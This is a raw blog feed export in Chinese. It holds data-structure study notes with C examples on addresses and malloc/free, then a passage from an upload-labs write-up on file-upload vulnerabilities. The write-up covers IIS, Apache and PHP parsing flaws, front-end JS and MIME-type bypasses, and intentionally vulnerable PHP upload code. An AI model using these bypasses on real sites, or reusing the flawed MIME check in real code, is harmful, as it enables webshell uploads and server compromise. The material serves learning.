&lt;li&gt;数据的逻辑结构是从数据元素的逻辑关系上描述数据的。&lt;/li&gt;
&lt;li&gt;是指数据元素之间的逻辑关系的整体，通常是从求解问题中提&lt;br /&gt;
炼出来的。&lt;/li&gt;
&lt;li&gt;数据逻辑结构与数据的存储无关，是独立于计算机的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2、物理结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据元素及其关系在计算机存储器中的存储方式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;逻辑结构实例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集合&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据元素只是属于一个集合，无其他关系&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150436900.png&#34; alt=&#34;image-20220906150436900&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线性结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一对一，线性表，栈，队列&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150444092.png&#34; alt=&#34;image-20220906150444092&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;树形结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一对多&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150452330.png&#34; alt=&#34;image-20220906150452330&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;图形结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;多对多&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150458844.png&#34; alt=&#34;image-20220906150458844&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接下来一个列题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155124056.png&#34; alt=&#34;image-20220905155124056&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155321699.png&#34; alt=&#34;image-20220905155321699&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155137275.png&#34; alt=&#34;image-20220905155137275&#34; /&gt;&lt;/p&gt;
&lt;p&gt;数据结构分 3 个方面&lt;/p&gt;
&lt;p&gt;逻辑结构，储存结构，数据运算&lt;/p&gt;
&lt;p&gt;数据元素之间的逻辑关系是数据的逻辑结构&lt;/p&gt;
&lt;p&gt;数据元素及其关系在计算器中的储存方式是数据的储存结构（物理结构）&lt;/p&gt;
&lt;p&gt;施加在该数据上面的操作是数据运算&lt;/p&gt;
&lt;p&gt;&lt;code&gt;同一逻辑可以对应多种储存结构&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;同样的运算，在不同的储存结构中，其实现过程是不同的&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#存储结构&#34;&gt;#&lt;/a&gt; 存储结构&lt;/h2&gt;
&lt;p&gt;顺序储存：&lt;/p&gt;
&lt;p&gt;借助元素在存储器中的相应位置来表示数据元素间的逻辑关系&lt;/p&gt;
&lt;p&gt;链式存储结构&lt;/p&gt;
&lt;p&gt;借助指示元素存储地址的指针表示数据元素间的逻辑关系&lt;/p&gt;
&lt;h2 id=&#34;数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据类型&#34;&gt;#&lt;/a&gt; 数据类型&lt;/h2&gt;
&lt;p&gt;数据类型是一个值的集合和定义在此集合上的一组操作的总称&lt;/p&gt;
&lt;p&gt;数据类型和数据结构之间的关系：数据类型就是已经实现了的数据结构&lt;/p&gt;
&lt;h3 id=&#34;抽象数据类型adt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#抽象数据类型adt&#34;&gt;#&lt;/a&gt; 抽象数据类型（ADT）：&lt;/h3&gt;
&lt;p&gt;更高层次的数据对象，可以通过固有的数据类型来表示或实现&lt;/p&gt;
&lt;p&gt;抽象数据类型（Abstract Data Type，ADT）只是一个数学模型以及定义在模型上的一组操作。通常是对数据的抽象，定义了数据的取值范围以及对数据操作的集合。&lt;/p&gt;
&lt;h2 id=&#34;算法分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法分析&#34;&gt;#&lt;/a&gt; 算法分析&lt;/h2&gt;
&lt;h3 id=&#34;算法的时间复杂度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法的时间复杂度&#34;&gt;#&lt;/a&gt; 算法的时间复杂度&lt;/h3&gt;
&lt;p&gt;时间复杂度表示一个程序运行所需要的时间，其具体需要在机器环境中才能得到具体的值，但我们一般并不需要得到详细的值，只是需要比较快慢的区别即可&lt;/p&gt;
&lt;p&gt;时间频度中，n 称为问题的规模，当 n 不断变化时，时间频度 T (n) 也会不断变化。&lt;br /&gt;
T（n)/f (n) 的极限值为不等于零的常数，则称 f (n) 是 T (n) 的同数量级函数。记作 T (n)=Ｏ(f (n)), 称Ｏ(f (n)) 为算法的渐进时间复杂度，简称时间复杂度。&lt;/p&gt;
&lt;h4 id=&#34;度量时间复杂度的两种方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#度量时间复杂度的两种方法&#34;&gt;#&lt;/a&gt; 度量时间复杂度的两种方法&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;h3 id=&#34;事后统计法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事后统计法&#34;&gt;#&lt;/a&gt; 事后统计法&lt;/h3&gt;
&lt;p&gt;在程序运行结束之后直接查看运行时间的方式进行时间复杂度的统计&lt;br /&gt;
（特别依赖计算机环境，算法的测试困难，有时一套算法需要海量的数据才能真正比较出效果）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;事先估计法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事先估计法&#34;&gt;#&lt;/a&gt; 事先估计法&lt;/h3&gt;
&lt;p&gt;事先统计法采取在计算机编译程序前对该算法进行预估的方式估算。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;算法的空间复杂度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法的空间复杂度&#34;&gt;#&lt;/a&gt; 算法的空间复杂度&lt;/h3&gt;
&lt;p&gt;一个程序的空间复杂度是指运行完一个程序所需内存的大小，其包括两个部分。&lt;/p&gt;
&lt;p&gt;a) 固定部分。这部分空间的大小与输入 / 输出的数据的个数多少、数值无关。主要包括指令空间（即代码空间）、数据空间（常量、简单变量）等所占的空间。这部分属于静态空间。&lt;/p&gt;
&lt;p&gt;b) 可变空间，这部分空间的主要包括动态分配的空间，以及递归栈所需的空间等。这部分的空间大小与算法有关。&lt;/p&gt;
&lt;h2 id=&#34;程序允许时的内存与地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#程序允许时的内存与地址&#34;&gt;#&lt;/a&gt; 程序允许时的内存与地址&lt;/h2&gt;
&lt;h3 id=&#34;内存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内存&#34;&gt;#&lt;/a&gt; 内存&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913002747179.png&#34; alt=&#34;image-20220913002747179&#34; /&gt;&lt;/p&gt;
&lt;p&gt;首先看这张图，可以看到每一个数据都有一个地址与其对应，也是因为有地址的存在，我们才可以使用计算机轻易的去访问一个数据&lt;/p&gt;
&lt;p&gt;接下来可以用一串 c 语言代码来体现数据喝地址的关系&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; array&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ACDEQSFVCK&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;The %c Address is %x \n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;array&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
       &lt;span class=&#34;token comment&#34;&gt;//% x 可以换成 % p 都是十六进制表示，只不过 % p 会把所有的位数显示出来&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913004106041.png&#34; alt=&#34;image-20220913004106041&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到这是一段连续的地址，当你把 char 类型换成 int 型之后可能又不太一样，因为 char 是 1 字节的，而 int 占 4 字节，所以 int 的地址会变成 4 个一跳的方式往上增长。&lt;/p&gt;
&lt;h2 id=&#34;两个必须学会的函数知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#两个必须学会的函数知识&#34;&gt;#&lt;/a&gt; 两个必须学会的函数知识&lt;/h2&gt;
&lt;h3 id=&#34;1-malloc函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-malloc函数&#34;&gt;#&lt;/a&gt; 1. Malloc 函数&lt;/h3&gt;
&lt;p&gt;malloc（）函数在堆中申请分配一个大小为 size 个字节的连续内存空间，若成功分配，则返回一个指向所分配空间起始地址的指针，否则返回空指针（NULL）。&lt;/p&gt;
&lt;h3 id=&#34;2free函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2free函数&#34;&gt;#&lt;/a&gt; 2.Free 函数&lt;/h3&gt;
&lt;p&gt;free（）函数用来释放已分配的内存空间，参数 p 是待释放的内存空间的首指针&lt;/p&gt;
&lt;p&gt;总结来说 malloc 就是用来申请内存空间，而 free 是为了释放内存空间&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 定义一个指向整形的指针变量&lt;/span&gt;
    p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 申请 5 个整形大小的内存空间并返回起始地址给 p&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 申请失败&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;// 执行申请失败的代码，一般 print 一个报错&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 退出&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    p&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 为空间中添加数据&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 打印这个数据&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 释放 p 的内存空间，此时 p 依旧存在，只不过失去了指向的对象，成了野指针&lt;/span&gt;
    p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 为其赋 NULL，此时它不再是一个野指针&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;整个内存申请释放的过程&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
        <title>文件上传小结</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
&lt;p&gt;在文件上传漏洞中，文件上传本身没什么问题，重点是文件上传到服务器后，服务器怎么解析上传的文件，上传漏洞的成因是开发者没有对用户上传的文件进行严格的过滤，攻击者可以上传危险文件&lt;/p&gt;
&lt;h1 id=&#34;解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析漏洞&#34;&gt;#&lt;/a&gt; 解析漏洞&lt;/h1&gt;
&lt;p&gt;攻击者利用上传漏洞通常会与 web 容器的解析漏洞相结合，下面简单记录一下常见的 web 容器的解析漏洞&lt;/p&gt;
&lt;h2 id=&#34;iis解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis解析漏洞&#34;&gt;#&lt;/a&gt; IIS 解析漏洞&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;iis 中当文件夹命名为【*.asa】或者【**.asp】时，其目录下的所有文件都会被当作 asp 文件来解析&lt;/li&gt;
&lt;li&gt;当文件为 *.asp;1.jpg 时，IIS6.0 同样会将文件当作 asp 解析&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;apache解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache解析漏洞&#34;&gt;#&lt;/a&gt; Apache 解析漏洞&lt;/h2&gt;
&lt;p&gt;Apache 解析文件时有一个原则就是当碰到不认识的扩展名的时候会从后向前解析，知道遇到认识的为止，如果都不认识则会暴漏其源码&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;其认识的文件扩展名在&amp;#x2F;conf&amp;#x2F;mime.types文件下记录&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015200221694.png&#34; alt=&#34;image-20221015200221694&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;php-cgi解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-cgi解析漏洞&#34;&gt;#&lt;/a&gt; PHP CGI 解析漏洞&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1waHBjZ2ktZHc3aXI3Y245MGJpMjdhMmIzYm9td2pxNWMuZmk=&#34;&gt;在 php 的配置文件中 cgi.fi&lt;/span&gt;:x_pathinfo 在部分版本中默认开启，多数存在于 nginx 与 php 的组合中，当末尾文件不存在时，会向前递归解析&lt;/p&gt;
&lt;h1 id=&#34;简单waf绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单waf绕过&#34;&gt;#&lt;/a&gt; 简单 waf 绕过&lt;/h1&gt;
&lt;p&gt;下面两张是 upload-labs 中的图，总结了文件上传常见 waf 的测试方法和绕过思路&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201545404.png&#34; alt=&#34;image-20221015201545404&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201347065.png&#34; alt=&#34;image-20221015201347065&#34; /&gt;&lt;/p&gt;
&lt;p&gt;想要绕过限制，首先要得知道，开发人员通常通过哪些方法防止文件上传漏洞&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端验证：客户端使用 Javascript 检测，在文件未上传的时候就对文件进行检测&lt;/li&gt;
&lt;li&gt;服务端验证：在服务端检查文件的 mime 类型，扩展名是否合法，检查文件内容等等&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;下面基于upload的绕过总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面基于upload的绕过总结&#34;&gt;#&lt;/a&gt; 下面基于 upload 的绕过总结&lt;/h1&gt;
&lt;h2 id=&#34;前端js绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端js绕过&#34;&gt;#&lt;/a&gt; 前端 JS 绕过&lt;/h2&gt;
&lt;h3 id=&#34;方法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一&lt;/h3&gt;
&lt;p&gt;浏览器禁用 js 验证&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二&lt;/h3&gt;
&lt;p&gt;用 burp 抓包修改&lt;/p&gt;
&lt;p&gt;将后缀名改成 php&lt;/p&gt;
&lt;h2 id=&#34;content-typemime绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#content-typemime绕过&#34;&gt;#&lt;/a&gt; Content-Type（mime）绕过&lt;/h2&gt;
&lt;p&gt;所谓 Content-Type 就是互联网媒体类型也就是 MIME 类型，决定浏览器将以什么形式、什么编码读取这个文件&lt;/p&gt;
&lt;p&gt;先判断我们用 POST 方式提交 (标签名为 submit) 的变量是否存在，如果存在，则接下来判断 upload 这个文件夹是否存在，如果存在则继续判断我们上传文件的文件类型，如果其文件类型为 image/jpeg 或者为 image/png 或者为 image/gif，那么让 temp_file 这个变量获取存储在服务器中文件的临时名称，然后让 img_path 这个变量为 upload+/+ 被上传文件的名称。再进行判断如果 move_uploaded_file () 函数返回 ture (也就是成功将文件移动到 img_path 路径下) 那么 is_upload 变量为 true，即上传成功&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
$msg &amp;#x3D; null;
if (isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#x2F;&amp;#x2F;判断我们用POST方式提交(标签名为submit)的变量是否存在
&amp;#123;
    if (file_exists(UPLOAD_PATH)) &amp;#x2F;&amp;#x2F;判断upload这个文件夹是否存在
    &amp;#123;
        if (($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;jpeg&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;png&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;gif&amp;#39;)) &amp;#x2F;&amp;#x2F;判断我们上传文件的文件类型
        &amp;#123;
            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
            $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]&amp;#x2F;&amp;#x2F;upload+&amp;#x2F;+文件名
            if (move_uploaded_file($temp_file, $img_path)) &amp;#x2F;&amp;#x2F;将文件移动到img_path路径下
            &amp;#123;
                $is_upload &amp;#x3D; true;
            &amp;#125; else &amp;#123;
                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
            &amp;#125;
        &amp;#125; else &amp;#123;
            $msg &amp;#x3D; &amp;#39;文件类型不正确，请重新上传！&amp;#39;;
        &amp;#125;
    &amp;#125; else &amp;#123;
        $msg &amp;#x3D; UPLOAD_PATH.&amp;#39;文件夹不存在,请手工创建！&amp;#39;;
    &amp;#125;
&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
